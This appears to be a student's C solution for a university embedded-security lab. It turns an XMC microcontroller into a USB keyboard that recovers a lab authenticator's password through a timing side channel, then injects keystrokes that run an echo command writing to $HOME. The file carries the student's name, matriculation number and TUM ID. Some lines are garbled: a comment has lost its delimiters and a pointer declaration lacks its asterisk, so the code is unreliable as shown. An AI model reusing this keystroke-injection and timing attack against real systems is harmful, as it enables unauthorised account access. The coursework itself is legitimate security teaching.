// Utku Budak - Technical University of Munich
// Department: ELectrical and Computer Engineering Master
// Semester: 1
// Lecture: Embedded Systems and Security
// Matriculation Number: 03703895
// TUM ID: ge72quf

/*
 * Using authenticator file, there will be some passwords generated!
 * The aim of this code is to find this password using time side channel attacks.
 * @author Utku Budak
 * @date 20.01.2021
 */

#include "KeyboardHID.h"
#include "german_keyboardCodes.h"

/*Macros: LED Macros, defined by the instructor */
#define LED1 P1_1
#define LED2 P1_0
/TICKS PER SECOND MACRO for SysTick TImer/
#define TICKSPERSECOND 10000
static volatile uint32_t clk;
static uint32_t charTimes[84];
int timeFirst = 1;
static uint8_t myNameCounter = 0;
static uint8_t wasSent = 0, sendIndex = 0;
static bool isCapsClosed = false;
static bool caseEnter = false;
static char CorrectPwCharacters[20];
static bool nextChar = false;
static bool successfulLogin = false;
static uint8_t randomIndex = 0;
static uint8_t writeNextChar = 0;
static uint8_t numOfSucChars = 0;

static uint8_t stringMyName[34] = {
    GERMAN_KEYBOARD_SC_E,
    GERMAN_KEYBOARD_SC_C,
    GERMAN_KEYBOARD_SC_H,
    GERMAN_KEYBOARD_SC_O,
    GERMAN_KEYBOARD_SC_SPACE,
    GERMAN_KEYBOARD_SC_2_AND_QUOTES,
    GERMAN_KEYBOARD_SC_U,
    GERMAN_KEYBOARD_SC_T,
    GERMAN_KEYBOARD_SC_K,
    GERMAN_KEYBOARD_SC_U,
    GERMAN_KEYBOARD_SC_SPACE,
    GERMAN_KEYBOARD_SC_B,
    GERMAN_KEYBOARD_SC_U,
    GERMAN_KEYBOARD_SC_D,
    GERMAN_KEYBOARD_SC_A,
    GERMAN_KEYBOARD_SC_K,
    GERMAN_KEYBOARD_SC_2_AND_QUOTES,
    GERMAN_KEYBOARD_SC_SPACE,
    GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,
    GERMAN_KEYBOARD_SC_SPACE,
    GERMAN_KEYBOARD_SC_4_AND_DOLLAR,
    GERMAN_KEYBOARD_SC_H,
    GERMAN_KEYBOARD_SC_O,
    GERMAN_KEYBOARD_SC_M,
    GERMAN_KEYBOARD_SC_E,
    GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,
    GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
    GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,
    GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,
    GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,
    GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,
    GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET,
    GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,
    GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE,
};

/* Clock configuration */
// This configuration is given by the instructor
XMC_SCU_CLOCK_CONFIG_t clock_config = {
    .syspll_config.p_div = 2,
    .syspll_config.n_div = 80,
    .syspll_config.k_div = 4,
    .syspll_config.mode = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
    .syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
    .enable_oschp = true,
    .calibration_mode = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
    .fsys_clksrc = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
    .fsys_clkdiv = 1,
    .fcpu_clkdiv = 1,
    .fccu_clkdiv = 1,
    .fperipheral_clkdiv = 1};

void SystemCoreClockSetup(void);

void SysTick_Handler(void)
{
    clk++;
}

uint8_t findTheChar();

/* Forward declaration of HID callbacks as defined by LUFA */
// This function is given by the instructor
bool CALLBACK_HID_Device_CreateHIDReport(
    USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo,
    uint8_t *const ReportID,
    const uint8_t ReportType,
    void *ReportData,
    uint16_t *const ReportSize);

void modification(int sendIndex, USB_KeyboardReport_Data_t *report);
void codification(int sendIndex, USB_KeyboardReport_Data_t *report, int i);

/* Forward declaration of HID callbacks as defined by LUFA */
// This function is given by the instructor
void CALLBACK_HID_Device_ProcessHIDReport(
    USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo,
    const uint8_t ReportID,
    const uint8_t ReportType,
    const void *ReportData,
    const uint16_t ReportSize);

int main(void)
{
    XMC_GPIO_SetMode(LED1, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
    XMC_GPIO_SetMode(LED2, XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
    USB_Init();

    for (int i = 0; i < 800000; i++)
        ;
    SysTick_Config(SystemCoreClock / TICKSPERSECOND);
    XMC_GPIO_SetOutputHigh(LED2);
    while (1)
    {
        HID_Device_USBTask(&Keyboard_HID_Interface);
    }
}

void modification(int sendIndex, USB_KeyboardReport_Data_t *report)
{
    uint8_t modifierArray[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 2, 2, 0, 2, 0, 2, HID_KEYBOARD_MODIFIER_RIGHTALT, 2, 2, 0, 0, 0, 2, HID_KEYBOARD_MODIFIER_RIGHTALT, HID_KEYBOARD_MODIFIER_RIGHTALT, HID_KEYBOARD_MODIFIER_RIGHTALT, 2, 2, 2, 2, 0, 2};
    report->Modifier = modifierArray[sendIndex];
}

void codification(int sendIndex, USB_KeyboardReport_Data_t *report, int i)
{
    uint8_t codifierArray[] = {0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1D, 0x1C, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1D, 0x1C, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x1E, 0x25, 0x26, 0x38, 0x38, 0x30, 0x27, 0x30, 0x36, 0x37, 0x36, 0x37, 0x64, 0x64, 0x25, 0x26, 0x24, 0x27, 0x24, 0x2D, 0x23, 0x21, 0x2C, 0x1F};
    report->KeyCode[0] = codifierArray[sendIndex];
}

bool CALLBACK_HID_Device_CreateHIDReport(
    USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo,
    uint8_t *const ReportID,
    const uint8_t ReportType,
    void *ReportData,
    uint16_t *const ReportSize)
{
    USB_KeyboardReport_Data_t *report = (USB_KeyboardReport_Data_t *)ReportData;
    *ReportSize = sizeof(USB_KeyboardReport_Data_t);
    static bool isReleased = true;
    static bool capsLockPressed = false;
    if (!successfulLogin)
    {
        if (sendIndex < 84 && nextChar)
        {
            if (wasSent)
            {

                report->Modifier = 0;
                report->Reserved = 0;
                report->KeyCode[0] = 0;
                wasSent = 0;
                if (!caseEnter)
                {
                    nextChar = false;
                    ++sendIndex;
                }
            }
            else if (caseEnter)
            {
                report->Modifier = 0;
                report->Reserved = 0;
                report->KeyCode[0] = 0x28;
                caseEnter = false;
                charTimes[sendIndex] = clk;
                clk = 0;
                wasSent = 1;
            }
            else
            {
                if (isReleased)
                {
                    report->Modifier = 0;
                    if (numOfSucChars == writeNextChar)
                    {
                        modification(sendIndex, report);
                        codification(sendIndex, report, 0);
                        writeNextChar = 0;
                        caseEnter = true;
                        isReleased = false;
                    }
                    else
                    {
                        modification(CorrectPwCharacters[writeNextChar], report);
                        codification(CorrectPwCharacters[writeNextChar], report, 0);
                        writeNextChar++;
                        isReleased = false;
                    }
                }
                else
                {
                    report->Modifier = 0;
                    report->Reserved = 0;
                    report->KeyCode[0] = 0;
                    isReleased = true;
                }
            }
        }
        else
        {
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = 0;
            wasSent = 0;
        }
    }
    else if (!isCapsClosed)
    {
        if (capsLockPressed)
        {
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = 0;
            wasSent = 0;
            isCapsClosed = true;
        }
        else if (!isCapsClosed)
        {
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = HID_KEYBOARD_SC_CAPS_LOCK;
            capsLockPressed = true;
            for (int i = 0; i < 10e5; ++i)
                ;
        }
    }
    else if (isCapsClosed)
    {
        if (myNameCounter < 34 && myNameCounter != 32)
        {
            if (myNameCounter == 5 || myNameCounter == 16 || myNameCounter == 18 || myNameCounter == 20 || myNameCounter == 21 || myNameCounter == 22 || myNameCounter == 23 || myNameCounter == 24 || myNameCounter == 25)
            {
                report->Modifier = 2;
            }
            else
            {
                report->Modifier = 0;
            }
            report->KeyCode[0] = stringMyName[myNameCounter];
            myNameCounter++;
        }
        else if (myNameCounter == 32 && timeFirst == 1)
        {
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = 0;
            timeFirst = 0;
        }
        else if (myNameCounter == 32 && timeFirst == 0)
        {
            report->KeyCode[0] = stringMyName[myNameCounter];
            myNameCounter++;
        }
        else if (myNameCounter == 34)
        {
            report->Modifier = 0;
            report->Reserved = 0;
            report->KeyCode[0] = 0x28;
            myNameCounter++;
        }
    }
    return true;
}
uint8_t findTheChar()
{
    uint8_t loc = 0;
    uint32_t max = 0;
    for (int i = 0; i < 84; i++)
    {
        if (max < charTimes[i])
        {
            max = charTimes[i];
            loc = i;
        }
    }
    return loc - 1;
}

// Called on report input. For keyboard HID devices, that's the state of the LEDs
// This function is given by the instructor
// However, it is modified for the
void CALLBACK_HID_Device_ProcessHIDReport(
    USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo,
    const uint8_t ReportID,
    const uint8_t ReportType,
    const void *ReportData,
    const uint16_t ReportSize)
{
    uint8_t report = (uint8_t)ReportData;

    if (*report & HID_KEYBOARD_LED_NUMLOCK)
    {
        XMC_GPIO_SetOutputHigh(LED1);
        if (sendIndex == 84)
        {
            randomIndex = findTheChar();
            CorrectPwCharacters[numOfSucChars] = randomIndex;
            numOfSucChars++;
            sendIndex = 0;
        }
        nextChar = true;
    }
    else
    {
        XMC_GPIO_SetOutputLow(LED1);
        nextChar = false;
    }

    if (*report & HID_KEYBOARD_LED_CAPSLOCK)
    {
        XMC_GPIO_SetOutputHigh(LED2);
        successfulLogin = true;
    }
    else
    {
        XMC_GPIO_SetOutputLow(LED2);
    }
}

// This function is given by the instructor
void SystemCoreClockSetup(void)
{
    /* Setup settings for USB clock */
    XMC_SCU_CLOCK_Init(&clock_config);

    XMC_SCU_CLOCK_EnableUsbPll();
    XMC_SCU_CLOCK_StartUsbPll(2, 64);
    XMC_SCU_CLOCK_SetUsbClockDivider(4);
    XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
    XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

    SystemCoreClockUpdate();
}